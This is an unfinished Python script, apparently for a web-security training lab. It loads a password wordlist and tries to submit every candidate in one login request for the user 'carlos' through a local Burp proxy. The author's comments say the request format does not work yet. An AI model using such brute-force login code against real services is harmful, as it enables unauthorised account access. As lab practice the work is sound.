# WIP - haven't figured out how to script this one yet
# Have idea of what the requests need to look at but haven't figured out how to get the format
import sys
import requests
import urllib3
import pandas as pd

# Suppress the insecure requests warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Add proxy for troubleshoot, for urllib3 all proxies should use http
# Uses the Burp proxy -> Make sure Burp is running
proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

# Given username in this case, so skipping enumeration

def password_enum(url):
    password_list = []
    data = pd.read_csv('./burp_pass.csv')
    for passw in data:
        password_list.append(passw)
        #print(passw)

    #print(new_passwords)
    new_list = []
    for pw in password_list:
        new_list.append(f'"{pw}",')
    new_list.insert(0,'[')
    new_list.append(']')
    print(new_list)
    #print(new_line_pw)
    format_pw = '\n'.join(new_list)
    print(format_pw)
    user_data = {"username":"carlos", "password":f"{format_pw}","":""}
    # This is URL encoding, so reqruest doesn't match what is shown in Burp - may need to try a different Python library?
    r = requests.post(url, data = user_data, verify=False, proxies=proxies)
    print(r.status_code)
    print(r.content)

    
        

if __name__ == "__main__":
    try:
        #valid_usernames = []
        url = sys.argv[1].strip()
        #valid_usernames = valid_usernames.append(sys.argv[2].strip())
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url>')
        print(f'[-] Example: {sys.argv[0]} www.example.com')
        sys.exit(-1)
    
    #print('[-] Performing user enumeration')
    #valid_usernames = username_enum(url)
    #print(valid_usernames)
    print('[-] Performing password enumeration')
    valid_passwords = password_enum(url)

